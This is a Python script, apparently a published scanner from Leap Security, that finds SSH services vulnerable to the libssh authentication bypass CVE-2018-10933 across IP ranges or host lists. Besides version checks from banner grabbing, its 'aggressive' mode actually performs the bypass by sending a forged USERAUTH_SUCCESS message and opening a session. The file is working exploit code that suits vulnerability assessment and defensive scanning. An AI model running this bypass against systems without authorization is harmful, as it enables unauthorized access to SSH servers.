#!/usr/bin/env python2
# CVE-2018-10933 Scanner by Leap Security (@LeapSecurity) https://leapsecurity.io


import argparse
import ipaddress
import os
import socket
import sys

import paramiko
from six import text_type

VERSION = "1.0.5"


class colors(object):
    blue = "\033[1;34m"
    normal = "\033[0;00m"
    red = "\033[1;31m"
    yellow = "\033[1;33m"


def pstatus(ip, port, banner):
    print("{blue}[*]{white} {ipaddr}:{port} is not vulnerable to authentication bypass ({banner})".format(
        blue=colors.blue, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))


def ptimeout(ip, port):
    print("{red}[-]{white} {ipaddr}:{port} has timed out.".format(
        red=colors.red, white=colors.normal, ipaddr=ip, port=port))


def ppatch(ip, port, banner):
    print("{blue}[*]{white} {ipaddr}:{port} has been patched ({banner})".format(
        blue=colors.blue, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))


def pvulnerable(ip, port, banner):
    print("{yellow}[!]{white} {ipaddr}:{port} is likely VULNERABLE to authentication bypass ({banner})".format(
        yellow=colors.yellow, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))


def pexception(ip, port, banner):
    print("{red}[-]{white} {ipaddr}:{port} has encountered an exception ({banner}).".format(
        red=colors.red, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))


def passive(ip, port, timeout=0.5):  # banner grab to verify vulnerable host
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        banner = s.recv(1024)
        s.close()
        return banner.split(b"\n")[0]
    except (socket.timeout, socket.error) as e:
        ptimeout(ip, port)
        return ""


def aggressive(ip, port, banner, timeout=0.5):  # bypass auth to verify vulnerable host
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)

        msg = paramiko.message.Message()
        t = paramiko.transport.Transport(s)
        t.start_client()

        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        t._send_message(msg)
        c = t.open_session(timeout=timeout)
        s.close()
        pvulnerable(ip, port, banner)
    except (socket.timeout, socket.error) as e:
        ptimeout(ip, port)
    except paramiko.SSHException as e:
        pstatus(ip, port, banner)
    except Exception as e:
        pexception(ip, port, banner)


parser = argparse.ArgumentParser(
    description='libssh Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)')
parser.add_argument(
    'target', help="An ip address (network) or new line delimited file containing IPs to banner grab for the vulnerability.")
parser.add_argument("-V", "--version", action="version",
                    help="Show version and exit", default=VERSION)
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument("-a", "--aggressive", action="store_true",
                    help="Identify vulnerable hosts by bypassing authentication")
parser.add_argument('-t', '--timeout', default=0.5, type=float, help="Set socket timeout")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
ips, results = [], []

print("\nlibssh scanner {}\n".format(VERSION))


if os.path.isfile(args.target):  # if file add hosts
    with open(args.target) as f:
        for line in f.readlines():
            ips.append(line.strip())
else:  # if not scan the provided IP
    network = ipaddress.ip_network(text_type(args.target.strip()))
    for ip in network:
        ips.append(str(ip))


print("Searching for Vulnerable Hosts...\n")

if args.aggressive:
    paramiko.util.log_to_file("paramiko.log")
    for ip in ips:
        aggressive(ip, int(args.port), passive(ip, int(args.port), timeout=args.timeout), timeout=args.timeout)
else:  # banner grab
    for ip in ips:
        banner = passive(ip, int(args.port), timeout=args.timeout)  # banner
        if banner:
            # vulnerable
            if any(version in banner for version in [b"libssh-0.6", b"libssh_0.6"]):
                pvulnerable(ip, args.port, banner)
            elif any(version in banner for version in [b"libssh-0.7", b"libssh_0.7"]):
                # libssh is 0.7.6 or greater (patched)
                if int(banner.split(b".")[-1]) >= 6:
                    ppatch(ip, args.port, banner)
                else:  # vulnerable
                    pvulnerable(ip, args.port, banner)
            elif any(version in banner for version in [b"libssh-0.8", b"libssh_0.8"]):
                # libssh is 0.8.4 or greater (patched)
                if int(banner.split(b".")[-1]) >= 4:
                    ppatch(ip, args.port, banner)
                else:  # vulnerable
                    pvulnerable(ip, args.port, banner)
            else:  # not vulnerable
                pstatus(ip, args.port, banner)

print("\nScanner Completed Successfully\n")
